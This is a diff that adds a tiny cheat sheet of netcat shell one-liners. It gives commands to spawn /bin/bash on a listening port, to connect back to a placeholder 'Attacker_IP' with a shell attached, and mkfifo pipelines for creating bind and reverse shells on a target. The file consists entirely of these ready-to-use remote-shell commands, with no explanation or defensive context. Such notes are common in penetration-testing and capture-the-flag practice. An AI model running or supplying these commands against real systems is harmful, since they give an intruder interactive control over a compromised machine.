@@ -1,0 +1,12 @@
+SHELL INTERCHANGE : 
+
+    REVERSE TO BIND : nc -lvnp Port_Num -e /bin/bash
+
+    BIND TO REVERSE : nc Attacker_IP Port_Num -e /bin/bash
+
+
+CREATE BIND SHELL LISTENER ON TARGET : mkfifo /tmp/f; nc -lvnp Port_Num < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+CREATE REVERSE SHELL LISTENER ON TARGET : mkfifo /tmp/f; nc Attacker_IP Port_Num < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
